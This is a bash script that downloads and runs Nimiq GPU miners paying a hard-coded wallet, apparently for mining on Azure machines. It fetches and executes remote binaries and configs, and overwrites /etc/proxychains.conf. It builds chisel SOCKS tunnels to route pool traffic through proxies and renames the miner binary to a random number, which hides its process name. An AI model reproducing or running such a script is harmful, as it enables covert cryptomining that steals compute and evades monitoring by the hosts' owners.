#!/bin/bash
if [ $4 == "proxy" ]
then
    pkill chisel
    rm -rf wget-log*
    wget -q https://github.com/jpillora/chisel/releases/download/1.3.1/chisel_linux_amd64.gz -O chisel_linux_amd64.gz
    #gunzip "chisel_linux_amd64.gz"  && chmod 777 chisel_linux_amd64
    [[ -e "chisel_linux_amd64" ]] || gunzip "chisel_linux_amd64.gz"  && chmod 777 chisel_linux_amd64
    port1=$RANDOM
    port2=$RANDOM
    port3=$RANDOM
    port4=$RANDOM
    port5=$RANDOM
    ./chisel_linux_amd64 client $1 $port1:socks $port2:socks $port3:socks $port4:socks $port5:socks & >/dev/null
    wget -q https://raw.githubusercontent.com/Vinhuit/azurenimpool/master/azure_script/pchain.conf -O pchain.conf
    cp -rf pchain.conf /etc/proxychains.conf
    sed -i "s/9050/${port1}/g"  /etc/proxychains.conf
    sed -i "s/9051/${port2}/g"  /etc/proxychains.conf
    sed -i "s/9052/${port3}/g"  /etc/proxychains.conf
    sed -i "s/9053/${port4}/g"  /etc/proxychains.conf
    sed -i "s/9054/${port5}/g"  /etc/proxychains.conf
    sleep 3
    #sed -i 's/proxy_dns/#proxy_dns/g'  /etc/proxychains.conf
    #proxychains curl ifconfig.me
fi
name=$RANDOM
if [ $3 == "nq" ]
then
    wget -q https://github.com/tomkha/nq-miner/releases/download/0.99.6/nq-miner-linux-0.99.6.tar.gz -O nq-miner-linux-0.99.6.tar.gz 
    tar xvzf nq-miner-linux-0.99.6.tar.gz 
    mv nq-miner $name 
    echo Start NQ
    if [ $4 == "proxy" ]
    then
        proxychains ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3 
    else
        ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3
    fi
else
    wget https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.3.0/noncerpro-cuda-linux-3.3.0.tar.gz -O noncerpro-cuda-linux-3.3.0.tar.gz 
    tar xvzf noncerpro-cuda-linux-3.3.0.tar.gz
    mv noncerpro  $name 
    echo Start Noncer
    if [ $4 == "proxy" ]
    then
        proxychains ./$name --address='NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U' --server $2 --port 443 --name $hostname --mode dumb 
    else
        ./$name --address='NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U' --server $2 --port 443 --name $hostname --mode dumb
    fi
    
fi
